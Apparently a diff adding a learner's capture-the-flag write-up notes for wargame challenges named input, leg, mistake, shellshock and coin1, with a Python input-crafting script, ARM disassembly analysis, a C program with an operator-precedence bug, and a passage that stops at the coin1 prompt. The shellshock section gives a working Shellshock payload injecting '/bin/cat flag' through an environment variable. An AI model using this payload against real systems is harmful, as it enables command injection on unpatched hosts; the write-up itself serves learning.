@@ -289,3 +289,221 @@ I then xor'd 0x6b8b4567 with 0xdeadbeef to get 0xb526fb88. However, the job stil
 
 Solution:
 3039230856
+
+-----------------------------------------
+Input - (AKA I don't know how sockets work)
+
+Error: I incorrectly thought that argc was related to the length of the string. Whups. It's actually the amount of arguments (which must be separated by a space - the part I forgot).
+
+Another notable mistake was that I got too caught up in attempting to treat the 0x00 as an actual hex value, rather than the string that it actually was...
+
+You need to set up an actual socket connection (nc -l -k -p 2223 in my case) in order to actually connect to it. Lol, I'm a socket noob.
+
+Below's the working python script as long as the file is on your computer (I understand that the file won't necessarily work as I don't have write permissions on the other server)
+
+This is more of a syntax challenge, which I really don't like personally (because I know jack about syntax).
+
+import struct, os, sys, socket
+from subprocess import *
+
+list = ['./a.out']
+
+for i in range(99):
+  list.append('A')
+
+list[65] = ''
+list[66] = '\x20\x0a\x0d'
+list[67] = "2222"
+
+r, w = os.pipe()
+r1, w1 = os.pipe()
+
+my_env = os.environ.copy()
+my_env["\xde\xad\xbe\xef"] = "\xca\xfe\xba\xbe"
+
+p = Popen(list, stdin=r1, stderr=r, env=my_env)
+
+os.write(w1, "\x00\x0a\x00\xff")
+os.write(w, "\x00\x0a\x02\xff")
+
+f = open("\x0a", 'wb')
+f.write("\x00\x00\x00\x00")
+f.close()
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect(("127.0.0.1", 2222))
+s.send("\xde\xad\xbe\xef")
+s.close()
+
+print(p.communicate()[0])
+
+Solution:
+Come back to it later...
+
+-----------------------------------------
+Leg
+
+key1: it seems to be essentially returning the value of the pc. (0x8cdc)
+   0x00008cdc <+8>:  mov   r3, pc
+   0x00008ce0 <+12>: mov   r0, r3
+   0x00008ce4 <+16>: sub   sp, r11, #0
+
+key2: it seems to return pc + 4 (0x8d04 + 4)
+   0x00008d04 <+20>: mov   r3, pc
+   0x00008d06 <+22>: adds  r3, #4
+   0x00008d08 <+24>: push  {r3}
+   0x00008d0a <+26>: pop   {pc}
+   0x00008d0c <+28>: pop   {r6}     ; (ldr r6, [sp], #4)
+   0x00008d10 <+32>: mov   r0, r3
+
+key3: it returns lr, register containing the return address of the function (0x8d80)
+   0x00008d28 <+8>:  mov   r3, lr
+   0x00008d2c <+12>: mov   r0, r3
+
+   (main function key3 call)
+   0x00008d7c <+64>: bl 0x8d20 <key3>
+   0x00008d80 <+68>: mov   r3, r0
+
+
+= 1A764 (or 108388)
+
+So, the main mistake I made in the comments above is that I don't know ARM (I tried to read it like x86 assembly).
+
+The main thing that I needed to know is that pc doesn't reference the current instruction, but the address of the 2nd instruction after the current one.
+
+
+So, the more correct version would be 0x8cdc (+ 8 due to ARM pc characteristics) + 0x8d04 + 4 (+ 4 as I skip 2 instructions, not 2 bytes, check above code if confused) + 0x8d80 (lr unaffected).
+
+This gives:  0x8d04+8+0x8cdc+8+0x8d80 = 108400
+
+Solution:
+108400
+
+-----------------------------------------
+Mistake
+
+#define PW_LEN 10
+#define XORKEY 1
+
+void xor(char* s, int len){
+   int i;
+   for(i=0; i<len; i++){
+      s[i] ^= XORKEY;
+   }
+}
+
+int main(int argc, char* argv[]){
+   
+   int fd;
+   if(fd=open("/home/mistake/password",O_RDONLY,0400) < 0){
+      printf("can't open password %d\n", fd);
+      return 0;
+   }
+
+   printf("do not bruteforce...\n");
+   sleep(time(0)%20);
+
+   char pw_buf[PW_LEN+1];
+   int len;
+   if(!(len=read(fd,pw_buf,PW_LEN) > 0)){
+      printf("read error\n");
+      close(fd);
+      return 0;      
+   }
+
+   char pw_buf2[PW_LEN+1];
+   printf("input password : ");
+   scanf("%10s", pw_buf2);
+
+   // xor your input
+   xor(pw_buf2, 10);
+
+   if(!strncmp(pw_buf, pw_buf2, PW_LEN)){
+      printf("Password OK\n");
+      system("/bin/cat flag\n");
+   }
+   else{
+      printf("Wrong Password\n");
+   }
+
+   close(fd);
+   return 0;
+}
+
+So, at first glance, I don't see anything wrong. Given the hints put out, I understand that the issue is most likely a operator problem. However, as I have little experience with fd in c, I don't understand what to do.
+
+I instead copied the c code onto my own machine so I could compile a new program. When I reran the new program, though, I noticed that the program was accepting input twice.
+
+A little more looking revealed that fd was 0 after this line of code:
+
+   if(fd=open("/home/mistake/password",O_RDONLY,0400) < 0){
+      printf("can't open password %d\n", fd);
+      return 0;
+   }
+
+This meant that pw_buf was reading in from input, as well as pw_buf2. So I just need to give two inputs ten characters wide that when xor'd give each other as answers. So I used AAAAAAAAAA (41414141414141414141) and @@@@@@@@@@ (40404040404040404040).
+
+Solution:
+AAAAAAAAAA
+@@@@@@@@@@
+
+
+-----------------------------------------
+Shellshock
+
+#include <stdio.h>
+int main(){
+   setresuid(getegid(), getegid(), getegid());
+   setresgid(getegid(), getegid(), getegid());
+   system("/home/shellshock/bash -c 'echo shock_me'");
+   return 0;
+}
+
+I have no idea where to start. So I looked up a bit on Wikipedia, and I found this line of code: 
+env x='() { :;}; echo vulnerable' ./bash -c "echo this is a test".
+
+Supposedly it exploits the shellshock bug, but when I type it into the console, nothing happens when I run the shellshock program. I realize I'm missing something - I look a little further and I see that setresuid() might have a vulnerability with the environment variables... but I have no idea how to make that work.
+
+So, after a little bit of research, I found out you're supposed to use export to bring the environment variable in. 
+
+So the more appropriate solution would be:
+export x='() { :;}; /bin/cat flag'. (the latter half of the code above was just a test)
+
+Solution:
+export x='() { :;}; /bin/cat flag'
+./shellshock
+
+-----------------------------------------
+coin1
+
+   ---------------------------------------------------
+   -              Shall we play a game?              -
+   ---------------------------------------------------
+   
+   You have given some gold coins in your hand
+   however, there is one counterfeit coin among them
+   counterfeit coin looks exactly same as real coin
+   however, its weight is different from real one
+   real coin weighs 10, counterfeit coin weighes 9
+   help me to find the counterfeit coin with a scale
+   if you find 100 counterfeit coins, you will get reward :)
+   FYI, you have 30 seconds.
+   
+   - How to play - 
+   1. you get a number of coins (N) and number of chances (C)
+   2. then you specify a set of index numbers of coins to be weighed
+   3. you get the weight information
+   4. 2~3 repeats C time, then you give the answer
+   
+   - Example -
+   [Server] N=4 C=2  # find counterfeit among 4 coins with 2 trial
+   [Client] 0 1      # weigh first and second coin
+   [Server] 20       # scale result : 20
+   [Client] 3        # weigh fourth coin
+   [Server] 10       # scale result : 10
+   [Client] 2        # counterfeit coin is third!
+   [Server] Correct!
+
+   - Ready? starting in 3 sec... -
+   
+N=676 C=10
